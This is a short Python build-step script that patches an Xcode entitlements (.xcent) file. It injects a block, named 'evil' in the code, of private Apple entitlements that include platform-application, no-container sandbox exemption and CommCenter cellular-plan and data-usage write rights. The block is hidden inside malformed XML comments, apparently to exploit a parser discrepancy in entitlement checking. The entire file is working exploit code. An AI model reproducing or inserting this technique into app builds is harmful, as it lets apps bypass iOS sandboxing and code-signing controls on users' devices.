import os
# preinstalled python is python2
filename = '/'.join(map(os.environ.get, ('TARGET_TEMP_DIR', 'FULL_PRODUCT_NAME'))) + '.xcent'
print("patch file named " + filename)

evil = '''\t<!---><!-->
\t<key>platform-application</key>
\t<true/>
\t<key>com.apple.private.security.no-container</key>
\t<true/>
\t<key>com.apple.CommCenter.fine-grained</key>
\t<array>
\t\t<string>cellular-plan</string>
\t\t<string>data-usage</string>
\t\t<string>data-allowed-write</string>
\t\t<string>preferences-write</string>
\t</array>
\t<!-- -->
'''

with open(filename, 'r') as fp:
  buf = fp.read()
cursor = buf.rfind('</dict>')
output = buf[0:cursor] + evil + buf[cursor:]
with open(filename, 'w') as fp:
  fp.write(output)
